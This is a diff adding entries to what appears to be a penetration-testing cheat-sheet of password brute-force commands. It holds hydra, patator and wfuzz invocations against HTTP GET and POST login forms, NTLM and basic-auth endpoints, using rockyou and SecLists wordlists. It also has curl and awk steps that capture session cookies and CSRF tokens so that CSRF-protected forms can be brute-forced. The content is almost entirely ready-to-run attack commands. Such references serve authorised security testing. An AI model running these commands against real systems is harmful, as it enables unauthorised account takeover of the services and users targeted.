@@ -9,11 +9,25 @@ patator
 hydra
 crowbar
 
+	HTTP
+GET
+hydra -L /usr/share/seclists/Usernames/top_shortlist.txt -P /usr/share/seclists/Passwords/rockyou-40.txt -e ns -F -u -t 1 -w 10 -v -V 111.11.1.11  http-get-form "/enpoint.php/:username=^USER^&password=^PASS^&login=YES:S=pword protect:H=Cookie\: PHPSESSID=${SESSIONID}"
+patator  http_fuzz  method=GET  follow=0  accept_cookie=0  --threads=1  timeout=10 url="http://target.dom/login.php?username=FILE1&password=FILE0&login=YES"  1=/usr/share/seclists/Usernames/top_shortlist.txt  0=/usr/share/seclists/Passwords/rockyou-40.txt header="Cookie: PHPSESSID=${SESSIONID}" -x quit:fgrep='pword protect'
+
 
 POST
 wfuzz --hc 404 -c -z list,admin -z file,/opt/SecLists/Passwords/korelogic-password.txt -d "user=FUZZ&password=FUZZ" http://192.168.1.111/admin/index.php
 hydra 192.168.1.111 -s 80 http-form-post "/admin/index.php:user=^USER^&password=^PASS^:Moved Temporarily" -l admin -P /opt/SecLists/Passwords/korelogic-password.txt -t 20
+hydra -l username -P passfile.txt target.dom/endpoint http-post-form "/endpoint/login/:usr=^USER^&pw=^PASS^:S=302"
 NTLM
 wfuzz -c --ntlm "admin:FUZZ" -z file,/opt/SecLists/Passwords/darkc0de.txt --hc 401 https://192.168.3.11/api
 BASIC AUTH (through proxy)
 wfuzz -c --hc 404,400,401 -z file,/opt/SecLists/Passwords/korelogic-password.txt -z file,/root/Documents/Audits/ActivosProduban/names.txt --basic "FUZZ:FUZ2Z" -p 127.0.0.1:8080 https://192.168.3.11/api/v1
+
+Cookies
+curl -s -c jar.cookie http://target.dom/
+SESSIONID=$(grep PHPSESSID jar.cookie | awk -F ' ' '{print $4}')
+CSRF
+CSRF=$(curl -s -c jar.cookie "https://target.dom/login.php" | awk -F 'value=' '/token/ {print $2}' | cut -d "'" -f2)
+patator http_fuzz method=GET follow=0 accept_cookie=0 --threads=1 timeout=5 --max-retries=0 url="https://target.dom/endpoint.php?uname=FILE1&pword=FILE0&csrf_token=_CSRF_&login=YES" 1=/usr/share/seclists/Usernames/top_shortlist.txt  0=/usr/share/seclists/Passwords/rockyou-40.txt header="Cookie: PHPSESSID=${SESSIONID}" before_urls="https://target.dom/endpoint" before_header="Cookie: PHPSESSID=${SESSIONID}" before_egrep="_CSRF_:<input type='hidden' name='user_token' value='(\w+)' />" -x quit:fgrep='pword protect'
+
